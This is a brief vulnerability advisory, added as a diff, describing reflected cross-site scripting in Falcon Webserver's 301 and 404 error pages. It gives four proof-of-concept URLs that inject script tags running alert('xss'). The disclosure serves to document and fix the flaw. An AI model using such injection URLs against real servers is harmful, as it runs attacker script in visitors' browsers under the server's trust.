@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/5435/info
+
+Falcon Webserver does not sufficiently sanitize HTML tags from error message output. In particular, attackers may inject HTML into 301 and 404 error pages. 
+
+It is possible to create a malicious link to the server which will generate an error page with attacker-supplied HTML and script code when visited. Arbitrary HTML and script code will be executed by the web client of the user visiting the server, in the security context of the server.
+
+
+* 301 Message XSS
+
+Closing TITLE tag:
+http://localhost/%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
+Closing A HREF:
+http://localhost/%22%3cscript%3ealert(%22xss%22)%3c/script%3e
+Closing A tag:
+http://localhost/%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
+
+* 404 Message XSS
+
+http://localhost/%3cscript%3ealert(%22xss%22)%3c/script%3e/
+
+The 301 examples will simply add a slash and pass it on to the browser,
+which then raises a 404, exploiting that vulnerability as well (although the
+301 exploits will cause some useless HTML to be added on)
